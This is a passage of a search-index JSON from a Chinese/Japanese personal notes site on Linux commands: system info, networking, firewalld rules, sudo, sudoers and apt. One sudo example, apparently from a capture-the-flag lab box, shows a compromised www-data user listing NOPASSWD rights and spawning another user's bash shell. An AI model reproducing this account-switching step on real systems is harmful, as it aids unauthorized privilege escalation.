<li><code>-r</code>\uff1a\u5185\u6838\u4fe1\u606f\u3002\u53ef\u4ee5\u786e\u8ba4\u662f\u5426\u6709\u5185\u6838\u6f0f\u6d1e\u3002<ul> <li>\u5982\uff1a<code>5.10.0-kali3-amd64</code>\uff0c\u7248\u672c\u53f7\u5bf9\u5e94\uff1a<code>\u4e3b\u7248\u672c\u53f7.\u6b21\u7248\u672c\u53f7.\u4fee\u8ba2\u7248\u672c\u53f7</code>\u3002<ul> <li>Linux3.0\u7248\u672c\u4e4b\u524d\uff0c\u6b21\u7248\u672c\u53f7\u7684\u5947\u6570\u662f\u5f00\u53d1\u7248\u3001\u5076\u6570\u662f\u7a33\u5b9a\u7248</li> <li>\u4e4b\u540e\u653e\u5f03\u4e86\u8fd9\u79cd\u6807\u8bc6\uff0c\u6539\u7528LTS\u3001RC\u7b49</li> </ul> </li> <li>\u5185\u6838\u8be6\u7ec6\u4fe1\u606f\uff1a<code>cat /proc/version</code></li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#arch","title":"arch","text":"<p>\u663e\u793a\u67b6\u6784\u3002\u5373<code>uname -a</code>\u7ed3\u679c\u4e2d<code>x86_64</code>\u90a3\u4e2a\u90e8\u5206\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#os","title":"OS\u7248\u672c","text":"<p><code>cat /etc/os-release</code> \u6216 <code>cat /etc/lsb-release</code>\uff08\u7ea2\u5e3d\uff09</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#cpu","title":"CPU\u4fe1\u606f","text":"<p><code>cat /proc/cpuinfo</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#top","title":"top","text":"<p><code>top -n 1</code>\uff1an1\u5373\u6307\u5237\u65b0\u4e00\u6b21\u3002</p> <p>\u754c\u9762\u89e3\u91ca - <code>load average</code> \u304c\u9ad8\u3044\u72b6\u614b\u3068\u3044\u3046\u306e\u306f\u300c\u30d7\u30ed\u30bb\u30b9\u304b\u3089\u30c7\u30a3\u30b9\u30af\u3078\u306e\u66f8\u304d\u8fbc\u307f\u304c\u7a4d\u6ede\u3057\u3066\u3044\u308b\u300d\u72b6\u614b\u3092\u793a\u3057\u3066\u3044\u308b\u3053\u3068\u304c\u591a\u304f</p> <p>n\u4e2aCPU\u2014\u2014\u5219load average\u7684\u6700\u5927\u8d1f\u8377\u4e3a\u201cn\u201d\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#watch","title":"watch","text":"<ul> <li>\u547d\u4ee4\u76d1\u63a7\u3002</li> <li><code>watch -n &lt;\u5237\u65b0\u79d2\u6570&gt; &lt;\u88ab\u76d1\u63a7\u547d\u4ee4&gt;</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#shell","title":"shell\u73af\u5883","text":"<ul> <li>\u67e5\u770b\u5f53\u524d\u7528\u6237\u4f7f\u7528\u7684shell\uff1a<code>echo $SHELL</code></li> <li>\u67e5\u770b\u672c\u673a\u53ef\u7528shell\uff1a<code>cat /etc/shells</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#binsh-c","title":"<code>/bin/sh -c</code>","text":"<p>\u5fc5\u8981\u573a\u666f\uff1a \u6bd4\u5982\uff0c\u4e00\u822c\u7528\u6237\u6267\u884c<code>echo \"hello\" &gt; test.txt</code>\uff0c\u662fOK\u7684\u3002\u4f46\u662f\u628atest.txt\u8bbe\u7f6e\u4e3aroot\u540e\uff0c\u5c31\u7b97\u7528<code>sudo echo \"hello\" &gt; test.txt</code>\u518d\u5199\u5165\u5c31\u6ca1\u6743\u9650\u4e86\u3002 \u56e0\u4e3a\u91cd\u5b9a\u5411\u7b26\u53f7\u4e5f\u662fbash\u547d\u4ee4\uff0c\u800csudo\u53ea\u662f\u8ba9echo\u63d0\u6743\uff0c\u6ca1\u6709\u63d0\u5347\u91cd\u5b9a\u5411\u7b26\u53f7\u7684\u6743\u9650\u3002\uff08\u5173\u4e8e\u62a5\u9519\u7684\u65f6\u95f4\u70b9\uff0c\u5176\u5b9e\u6709\u4e2ashell\u89e3\u6790\u547d\u4ee4\u7684\u95ee\u9898\uff1a\u4e0d\u662f\u5199\u5165\u7684\u65f6\u5019\u62a5\u9519\u3002shell\u89e3\u6790\u4e00\u884c\u7684\u6bcf\u4e2a\u547d\u4ee4\u7a0b\u5e8f\uff0c\u800c\u91cd\u5b9a\u5411\u6216pipe\u4e5f\u662f\u547d\u4ee4\uff0c\u4e14\u4f1a\u6682\u65f6\u6253\u5f00\u6587\u4ef6\uff0c\u662f\u5728\u6b64\u65f6\u89e6\u53d1\u6743\u9650\u95ee\u9898\uff09</p> <p>\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <ol> <li><code>sudo sh -c 'command'</code>\u3002\u8ba9bash\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u5b8c\u6574\u547d\u4ee4\uff0csudo\u7684\u5f71\u54cd\u8303\u56f4\u5c31\u53ef\u4ee5\u6269\u5c55\u5230\u6574\u6761\u547d\u4ee4\u3002</li> <li><code>echo \"hello\" | sudo tee &lt;file&gt;</code>\u3002\u56e0\u4e3aecho\u5e76\u4e0d\u9700\u8981sudo\uff0c\u5c06sudo\u7684\u63d0\u6743\u7ed9tee\u547d\u4ee4\u8fdb\u884c\u6587\u4ef6\u5199\u5165\u3002</li> </ol> <p>\u7406\u89e3shell\u8fdb\u7a0b\uff1a https://blog.csdn.net/renzhentinghai/article/details/82662024</p> <ul> <li>exec\u548csource\u4e00\u6837\u4e0d\u65b0\u5efa\u5b50\u8fdb\u7a0b\uff0c\u800c\u533a\u522b\u4e3a\uff1a\u8c03\u7528exec\u662f\u4ee5\u65b0\u7684\u8fdb\u7a0b\u53bb\u4ee3\u66ff\u539f\u6765\u7684\u8fdb\u7a0b\uff0c\u4f46\u8fdb\u7a0b\u7684PID\u4fdd\u6301\u4e0d\u53d8\u3002 \u66ff\u6362\u4e86\u539f\u6765\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u7684\u5185\u5bb9\u3002\u539f\u8fdb\u7a0b\u7684\u4ee3\u7801\u6bb5\uff0c\u6570\u636e\u6bb5\uff0c\u5806\u6808\u6bb5\u88ab\u65b0\u7684\u8fdb\u7a0b\u6240\u4ee3\u66ff\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_24","title":"\u7ec8\u7aef\u73af\u5883","text":"<p>\u4e0d\u540c\u7684\u7ec8\u7aef\u7c7b\u578b\u53ef\u80fd\u652f\u6301\u4e0d\u540c\u7684\u989c\u8272\u65b9\u6848\u3001\u5b57\u7b26\u96c6\u3001\u4ee5\u53ca\u7279\u6b8a\u529f\u80fd\uff08\u5982\u5149\u6807\u79fb\u52a8\uff09\u3002</p> <ul> <li>\u67e5\u770b\u5f53\u524d\u73af\u5883\uff1a<code>echo $TERM</code></li> <li>\u5e38\u7528\u7ec8\u7aef\u7c7b\u578b\uff1a<code>xterm</code>\u3001<code>xterm-256color</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_25","title":"\u7f51\u7edc\u548c\u901a\u4fe1","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_26","title":"\u8def\u7531\u8868","text":"<p><code>netstat -rn</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#dhclient","title":"dhclient","text":"<p><code>dhclient</code>\uff1a\u83b7\u53d6\u65b0\u7684IP\u5730\u5740\u3002\u5982\u679c\u5df2\u7ecf\u6709IP\uff0c\u5219\u9700\u8981\u5148\u91ca\u653e\uff1a</p> <ul> <li><code>dhclient -r</code>\uff1a\u91ca\u653e\u5f53\u524d\u7684IP\u5730\u5740\uff08\u7684\u79df\u7ea6\uff09</li> </ul> <p><code>-v</code>\uff1a\u8be6\u7ec6</p> <ul> <li>log\u6587\u4ef6\u8def\u5f84\uff1a<code>/var/lib/dhcp/dhclient.leases</code></li> </ul> <p>[!NOTE] [[Kali\u642d\u5efa#Hyper-V]]\u7684\u865a\u62df\u673a\u8fd8\u539f\u5feb\u7167\u540e\u53ef\u80fd\u7f51\u7edc\u4e0d\u901a\u3002\u539f\u56e0\uff1a\u53ef\u80fd\u662fARP\u8868\uff08\u65b0\u65e7\u5feb\u7167MAC\u548cIP\u4e0d\u5bf9\u5e94\u4e86\uff09\u3002\u6240\u4ee5\u91cd\u65b0\u5206\u914dDHCP\uff1a<code>dhclient -r &amp;&amp; sudo dhclient</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#ip","title":"\u4fee\u6539IP","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#linuxredhat","title":"Linux\u53d1\u884c\u7248#Redhat\u7cfb\u5217","text":"<ul> <li><code>/etc/sysconfig/network-scripts</code></li> <li>\u7528init\u505a\u670d\u52a1\u7ba1\u7406\u5668\u7684OS\uff1a<code>service networking restart</code></li> <li>\u7528systemd\u505a\u670d\u52a1\u7ba1\u7406\u5668\u7684OS\uff1a<code>systemctl restart network</code></li> <li>CentOS8\u4e4b\u540e\u7528\uff1a<code>systemctl restart NetworkManager</code> https://i-think-it.net/rhel8-network-restart/</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#linuxdebain","title":"Linux\u53d1\u884c\u7248#Debain\u7cfb\u5217","text":"<p>\u91cd\u542f\u547d\u4ee42\uff1a<code>sudo service networking restart</code></p> <p>[!NOTE] \u4e0a\u8ff0\u4e24\u79cd\u91cd\u542f\u547d\u4ee4 \u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e24\u4e2a\u547d\u4ee4\u5b9e\u9645\u4e0a\u662f\u7b49\u6548\u7684\uff0c\u5b83\u4eec\u90fd\u7528\u4e8e\u91cd\u542f\u7f51\u7edc\u670d\u52a1\u3002 <code>sudo service networking restart</code>\u662f\u4e00\u79cd\u66f4\u63a8\u8350\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u5b83\u662f\u4e00\u79cd\u901a\u7528\u7684\u547d\u4ee4\u5f62\u5f0f\uff0c\u9002\u7528\u4e8e\u591a\u4e2a\u670d\u52a1\u548c\u64cd\u4f5c\u7cfb\u7edf\u3002 \u800c<code>/etc/init.d/networking restart</code>\u5219\u76f4\u63a5\u6307\u5411\u7f51\u7edc\u670d\u52a1\u7684\u542f\u52a8\u811a\u672c\u6587\u4ef6\uff0c\u662f\u4e00\u79cd\u66f4\u5177\u4f53\u7684\u65b9\u5f0f\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#netstat","title":"netstat","text":"<p>\u53c2\u7167Linux\u547d\u4ee4#ss</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#ss","title":"ss","text":"<p>netstat\u7684\u66ff\u4ee3\u3002</p> <ul> <li>-a\uff1a\u6b63\u5728\u4f7f\u7528\u7684\u6240\u6709port/socket</li> <li>-n\uff1a\u663e\u793a\u7aef\u53e3\u6570\u5b57\u800c\u4e0d\u89e3\u6790\u4e3a\u670d\u52a1\u540d</li> <li>-o\uff1a\u663e\u793atimer\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09</li> <li>-p\uff1a\u663e\u793a\u8fdb\u7a0b</li> <li>-t\uff1a\u663e\u793aTCP</li> <li>-l\uff1a\u663e\u793a\u6b63\u5728\u76d1\u542c\u7684\u7aef\u53e3</li> </ul> <p>\u72b6\u6001</p> <ul> <li>UNCONN\uff1aunconnected \u306e\u610f\u5473\u3067\u3001UDP\u306b\u304a\u3051\u308b\u5f85\u3061\u53d7\u3051\u30dd\u30fc\u30c8\u3092\u8868\u3057\u307e\u3059\u3002</li> <li>ESTAB\uff1a3way handshake\u304c\u6210\u529f\u3057\u305f\u72b6\u614b\u3001\u3064\u307e\u308aTCP\u30b3\u30cd\u30af\u30b7\u30e7\u30f3\u304c\u78ba\u7acb\u3057\u305f\u72b6\u614b\u3092\u610f\u5473\u3057\u307e\u3059\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#nmtui","title":"nmtui","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#iptables","title":"iptables","text":"<p>iptables\u662fLinux\u7cfb\u7edf\u6d41\u884c\u7684\u9632\u706b\u5899\u8f6f\u4ef6\uff0c\u5728\u5927\u90e8\u5206\u53d1\u884c\u7248\u4e2d\u90fd\u81ea\u5e26\u3002\u800c\u5bb9\u5668\u7684\u8bbf\u95ee\u63a7\u5236\u4e3b\u8981\u901a\u8fc7iptables\u6765\u8fdb\u884c\u7ba1\u7406\u548c\u5b9e\u73b0\u3002 CentOS6\u53ca\u4e4b\u524d\u90fd\u5728\u7528\u8fd9\u4e2a\uff0cCentOS7\u5f00\u59cb\u7528\u65b0\u7684\u547d\u4ee4\uff1afirewalld\uff08\u4f46\u662f\u539f\u7406\u8fd8\u662fiptables\uff0c\u7b97\u662f\u5c01\u88c5\u4e86\uff09\u3002</p> <ul> <li><code>iptables -t \u8868\u540d --list --line-numbers</code></li> <li><code>iptables -t \u8868\u540d -L \u94fe\u540d</code><ul> <li><code>iptables -t nat -L -n</code></li> </ul> </li> </ul> <p>\u5173\u4e8elinux\u8f6c\u53d1windows\u6d41\u91cf\u4ee5\u5b9e\u73b0windows\u4e0eTHM\u3001HTB\u7684VPN\u4e92\u901a\uff1ahttps://timeless613.github.io/kiwi/Resources/iptables/</p> <p>\uff08Netfilter5\u88685\u94fe\uff09</p> <p>\u7406\u89e3\uff1a </p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#firewalld","title":"firewalld","text":"<p>\u5b9e\u9645\u4f7f\u7528\u547d\u4ee4\uff1a<code>firewall-cmd</code></p> <p>CentOS7\u9ed8\u8ba4\u8fd9\u4e2a\u800c\u4e0d\u662fiptables\u4e86\u3002</p> <ul> <li>\u4e3b\u8981\u56e0\u4e3a\u865a\u62df\u5316\u8d8b\u52bf\u4f7f\u5f97Linux\u7684\u7f51\u7edc\u975e\u5e38\u590d\u6742\uff0c\u7528iptables\u914d\u7f6e\u592a\u56f0\u96be\u3002\u4e14iptables\u7684\u8bbe\u7f6e\u8fd8\u53ef\u80fd\u548c\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u51b2\u7a81\uff0c\u7ba1\u7406\u6df7\u4e71\u3002</li> <li>\u7279\u70b9\uff1a\u53ef\u4ee5\u4e3a\u6bcf\u4e2aNIC\u914d\u7f6e\u8bbe\u5b9a</li> </ul> <p>\u76f8\u5173\u914d\u7f6e\u6587\u4ef6\uff1a<code>/usr/lib/firewalld</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#9zone","title":"\u9ed8\u8ba49\u4e2azone\u7684\u9ed8\u8ba4\u914d\u7f6e","text":"<ol> <li>trusted\uff1a\u5141\u8bb8\u6240\u6709\u5305\u901a\u8fc7\uff08\u5141\u8bb8\u8fdb\u51fa\uff09\u3002\u3010\u5982\u679c\u6dfb\u52a0\u4e86\u7aef\u53e3\u7b49\u914d\u7f6e\uff0c\u5219\u53ea\u5141\u8bb8\u914d\u7f6e\u7684\u89c4\u5219\u901a\u8fc7\u3002\u5176\u4ed6zone\u4f30\u8ba1\u4e00\u6837\u3011</li> <li>drop\uff1a\u4e22\u5f03\u6240\u6709\u5916\u90e8\u8fdb\u6765\u7684\u5305\uff08\u5185\u90e8\u7684\u5305\u53ef\u4ee5\u51fa\u53bb\uff0c\u4f46\u662f\u4e22\u5f03\u4e86\u8fd4\u56de\u7684\u5305\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u5c31\u662f\u65e0\u6cd5\u901a\u4fe1\uff09</li> <li>block\uff1ablock\u57fa\u672c\u4f1a\u5c4f\u853d\u5916\u90e8\u8fdb\u6765\u7684\u5305\u2014\u2014\u9664\u4e86\u4ece\u5185\u90e8\u51fa\u53bb\u7684\u5305\u7684\u8fd4\u56de\u5305\uff08\u5bf9\u6bd4drop\uff09</li> <li>public\uff1a\u9ed8\u8ba4\u4ec5\u5141\u8bb8ssh\u548cdhcpv6-client\u901a\u4fe1</li> <li>dmz\uff1a\u9ed8\u8ba4\u4ec5\u5141\u8bb8ssh</li> <li>external\uff1a</li> <li>internal\uff1a</li> <li>work\uff1a</li> <li>home\uff1a</li> </ol> <p>\u901a\u5e38\uff0c\u547d\u4ee4\u884c\u914d\u7f6e\u7684\u662f\u5165\u7ad9\u89c4\u5219\u3002\u51fa\u7ad9\u901a\u4fe1\u901a\u5e38\u4e0d\u9700\u8981\u989d\u5916\u914d\u7f6e\uff0c\u56e0\u4e3a\u5927\u591a\u6570\u9632\u706b\u5899\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u5141\u8bb8\u51fa\u7ad9\u901a\u4fe1\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_27","title":"\u57fa\u672c\u547d\u4ee4","text":"<p><code>firewall-cmd [--zone=trusted] --list-all</code></p> <ul> <li>\u4e0d\u6307\u5b9azone\u7684\u8bdd\u4f1a\u663e\u793a\u9ed8\u8ba4zone\uff08firewall-cmd --get-default-zone\uff09</li> <li>\u9ed8\u8ba4zone\uff1a\u5f53\u7f51\u7edc\u6570\u636e\u5305\u5230\u8fbe\u7cfb\u7edf\u4e0a\u7684\u63a5\u53e3\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u660e\u786e\u6307\u5b9a\u8981\u5206\u914d\u7ed9\u54ea\u4e2a\u533a\u57df\u65f6\uff0c\u6570\u636e\u5305\u5c06\u88ab\u5206\u914d\u5230\u7684\u9ed8\u8ba4\u533a\u57df\u3002\u9ed8\u8ba4\u533a\u57df\u7684\u4f5c\u7528\u662f\u5b9a\u4e49\u4e86\u5bf9\u4e8e\u672a\u77e5\u6765\u6e90\u7684\u6570\u636e\u5305\u5e94\u8be5\u5e94\u7528\u54ea\u4e9b\u9632\u706b\u5899\u89c4\u5219\u3002</li> </ul> <p><code>firewall-cmd --list-all-zones</code>\uff1a\u4e5f\u4f1a\u663e\u793a\u672a\u6d3b\u52a8\u7684zone</p> <p><code>--permanent</code>\uff1a\u6301\u4e45\u8bbe\u7f6e</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#firewalld_1","title":"\u9879\u76ee\u7406\u89e3firewalld","text":"<p>SOAR EdgeGW server: <pre><code>sudo dnf install firewalld -y\n\nsudo systemctl start firewalld\n\nsudo firewall-cmd --permanent --zone=trusted --add-interface=cni0 &amp;&amp;\nsudo firewall-cmd --permanent --zone=trusted --add-interface=flannel.1 &amp;&amp;\nsudo firewall-cmd --permanent --zone=trusted --add-port=443/tcp &amp;&amp;\nsudo firewall-cmd --permanent --zone=trusted --add-port=6443/tcp &amp;&amp;\nsudo firewall-cmd --permanent --zone=trusted --add-port=10250/tcp\n\nsudo firewall-cmd --permanent --zone=public --add-port=22/tcp\n\nsudo firewall-cmd --reload &amp;&amp; sudo systemctl restart firewalld\n</code></pre></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_28","title":"\u7528\u6237\u548c\u6743\u9650\u7ba1\u7406","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#su","title":"su","text":"<p>\u5207\u6362\u7528\u6237\u3002</p> <p><code>su</code>\u548c<code>su -</code>\uff1a</p> <ul> <li>su\u547d\u4ee4\u4e0d\u6307\u5b9auser\u540d\u5219\u9ed8\u8ba4root</li> <li><code>su -</code>\u662f\u7528\u6237\u548cLinux\u547d\u4ee4#shell\u73af\u5883\u90fd\u5207\u6362\uff0c\u6240\u4ee5\u73af\u5883\u53d8\u91cf\u4f1a\u4e0d\u540c</li> <li><code>su</code>\u53ea\u5207\u6362\u4e86\u7528\u6237\uff0c\u5c31\u53ef\u80fd\u51fa\u73b0PATH\u9519\u8bef</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#useradd","title":"useradd","text":"<ul> <li><code>-m</code>\uff1a\u81ea\u52a8\u6dfb\u52a0\u5bb6\u76ee\u5f55\uff08\u4f3c\u4e4e\u9ed8\u8ba4\uff09</li> <li><code>-s /bin/bash</code>\uff1a \u521b\u5efa\u65f6\u6307\u5b9ashell\uff08\u9ed8\u8ba4/bin/sh\u6216bash?\uff09\uff0c\u6216\u8005\u53ef\u4ee5\u4e4b\u540e\u7f16\u8f91passed\u6587\u4ef6\u4fee\u6539</li> </ul> <p>[!NOTE] \u6dfb\u52a0\u65b0\u7528\u6237\u540e\uff0c\u8981\u7528<code>passwd</code>\u547d\u4ee4\u7ed9\u4ed6\u52a0\u5bc6\u7801\uff0c\u5426\u5219\u65e0\u6cd5\u767b\u9646\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#passwd","title":"passwd","text":"<p><code>passwd [user]</code>\uff1a\u66f4\u6539\uff08\u5f53\u524d/\u6307\u5b9a\uff09\u7528\u6237\u5bc6\u7801</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#sudo","title":"sudo","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#sudo_1","title":"sudo\u6d41\u7a0b","text":"<p>sudo \u6267\u884c\u547d\u4ee4\u7684\u6d41\u7a0b\u662f\u5f53\u524d\u7528\u6237\u5207\u6362\u5230\u5176\u4ed6\u7528\u6237\uff08<code>-u</code>\u6307\u5b9a\uff0c\u4e0d\u6307\u5b9a\u5219\u9ed8\u8ba4root\uff09\uff0c\u7136\u540e\u4ee5\u6307\u5b9a\u8eab\u4efd\u6267\u884c\u547d\u4ee4\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u76f4\u63a5\u9000\u56de\u5230\u5f53\u524d\u7528\u6237\u3002</p> <p>\u4f8b\u5b50\uff1a <code>-u</code> \u6307\u5b9a\u7528\u6237 <pre><code>www-data@misdirection:/var/www/html/wordpress$ sudo -l\n\u2026\nUser www-data may run the following commands on localhost:\n    (brexit) NOPASSWD: /bin/bash\nwww-data@misdirection:/var/www/html/wordpress$ sudo -u brexit /bin/bash\n</code></pre></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#sudo-l","title":"<code>sudo -l</code>","text":"<p>\u67e5\u770b\u662f\u5426\u6709sudo\u6743\u9650\u3002</p> <ul> <li>\u4f1a\u8981\u6c42\u5f53\u524d\u7528\u6237\u7684\u5bc6\u7801</li> <li>\u4f46\u662f\uff0c\u53ea\u8981sudoers\u914d\u7f6e\u6709\u4efb\u610f\u4e00\u6761<code>NOPASSWD</code>\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c<code>sudo -l</code>\uff08\u6709\u53ef\u80fd\u53ea\u663e\u793a\u914d\u7f6e\u4e86<code>NOPASSWD</code>\u7684\u547d\u4ee4\uff0c\u672a\u6d4b\u8bd5\uff09</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#sudoers","title":"\u914d\u7f6esudoers","text":"<p>\u5c3d\u91cf\u522b\u52a8 <code>/etc/sudoers</code> \u6587\u4ef6\uff0c\u800c\u662f\u5f80 <code>/etc/sudoers.d/</code> \u91cc\u6dfb\u52a0\u3002 \u5176\u683c\u5f0f\u4e3a\uff1a<code>&lt;\u7528\u6237\u540d/%\u7ec4\u540d&gt;   \u4e3b\u673a\u540d=(\u53ef\u5207\u6362\u7684\u7528\u6237:\u53ef\u5207\u6362\u7684\u7ec4) [NOPASSWD: ]ALL</code></p> <p>\u53d1\u73b0</p> <ul> <li>\u5373\u4f7fsudoers\u6587\u4ef6\u91cc\u914d\u7f6e\u4e86\u7edd\u5bf9\u8def\u5f84\uff0c\u547d\u4ee4\u884c\u4f9d\u7136\u53ef\u4ee5\u7528\u76f8\u5bf9\u8def\u5f84\u2014\u2014\u53ea\u8981\u53c2\u7167$PATH\u540e\u7684\u7edd\u5bf9\u8def\u5f84\u548csudoers\u6587\u4ef6\u91cc\u7684\u4e00\u6837\u5c31\u884c</li> </ul> <p>\u4f8b\u5b50 <pre><code>testuser        ALL=(ALL:ALL) /bin/bash\n%kali-trusted   ALL=(ALL:ALL) NOPASSWD: ALL\n</code></pre></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#pam","title":"pam","text":"<p>pam\uff1aPluggable Authentication Modules\uff0c\u53ef\u63d2\u62d4\u5f0f\u8ba4\u8bc1\u6a21\u5757\u3002</p> <p><code>/etc/pam.d/</code>\uff1a</p> <ul> <li>system-auth</li> <li>password-auth</li> <li>fingerprint-auth</li> <li>smartcard-auth</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#wheel","title":"wheel","text":"<p>\u6e90\u4e8ebig wheel\uff1a\u5927\u4eba\u7269\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#chmod","title":"chmod","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#chown","title":"chown","text":"<p><code>chown -R user:group</code></p> <ul> <li>-R\uff1a\u9012\u5f52</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#chgrp","title":"chgrp","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#chage","title":"chage","text":"<p>\u4fee\u6539\u5bc6\u7801\u7b56\u7565\u3002</p> <p><code>chage -l &lt;user&gt;</code>\uff1a\u786e\u8ba4\u7528\u6237\u5bc6\u7801\u7b56\u7565\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_29","title":"\u8f6f\u4ef6\u5305\u7ba1\u7406","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#linuxdebain_1","title":"Linux\u53d1\u884c\u7248#Debain\u7cfb\u5217","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#aptadvanced-packaging-tool","title":"apt\uff08Advanced Packaging Tool\uff09","text":"<ul> <li>DEB \u5305\u683c\u5f0f</li> </ul> <p>\u68c0\u67e5\u66f4\u65b0&amp;\u5b89\u88c5\u66f4\u65b0\uff08\u5373\u66f4\u65b0\u5e93\u548c\u66f4\u65b0\u8f6f\u4ef6\uff09\uff1a<code>apt update &amp;&amp; apt upgrade &lt;\u5305\u540d&gt;</code></p> <ul> <li><code>apt update</code> \u53ea\u662f\u68c0\u67e5\u66f4\u65b0\uff08\u5e94\u7528\u66f4\u65b0\u7684\u8f6f\u4ef6\u6e90 <code>/etc/apt/sources.list</code>\uff09</li> <li>\u8fd8\u6709<code>remove</code>\u547d\u4ee4</li> </ul> <p>apt \u9700\u8981\u5355\u72ec\u8fd0\u884c apt update \u547d\u4ee4\u6765\u68c0\u67e5\u66f4\u65b0\u7684\u539f\u56e0\u5728\u4e8e\u5176\u8bbe\u8ba1\u54f2\u5b66\u548c\u5de5\u4f5c\u65b9\u5f0f\u7684\u4e0d\u540c\u3002  apt \u4f7f\u7528\u7684\u662f Debian \u8f6f\u4ef6\u5305\u7ba1\u7406\u7cfb\u7edf\uff0c\u800c yum \u4f7f\u7528\u7684\u662f RPM \u8f6f\u4ef6\u5305\u7ba1\u7406\u7cfb\u7edf\u3002\u8fd9\u4e24\u8005\u7684\u8bbe\u8ba1\u548c\u539f\u7406\u4e0d\u540c\uff0c\u5bfc\u81f4\u4e86\u5b83\u4eec\u5728\u66f4\u65b0\u8f6f\u4ef6\u5305\u5217\u8868\u65b9\u9762\u6709\u6240\u4e0d\u540c\u3002 \u5728 apt \u4e2d\uff0c\u8f6f\u4ef6\u5305\u5217\u8868\u548c\u8f6f\u4ef6\u5305\u4fe1\u606f\u5b58\u50a8\u5728\u672c\u5730\u7f13\u5b58\u4e2d\uff08\u901a\u5e38\u4f4d\u4e8e /var/lib/apt/lists/ \u76ee\u5f55\u4e0b\uff09\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21\u8fd0\u884c apt \u547d\u4ee4\u65f6\u90fd\u4f1a\u5b9e\u65f6\u4ece\u8fdc\u7a0b\u5b58\u50a8\u5e93\u4e0b\u8f7d\u3002\u56e0\u6b64\uff0c\u9700\u8981\u5b9a\u671f\u8fd0\u884c apt update \u6765\u66f4\u65b0\u672c\u5730\u7f13\u5b58\uff0c\u4ee5\u786e\u4fdd\u60a8\u83b7\u5f97\u6700\u65b0\u7684\u8f6f\u4ef6\u5305\u4fe1\u606f\u3002 \u4e0e\u4e4b\u4e0d\u540c\uff0cyum 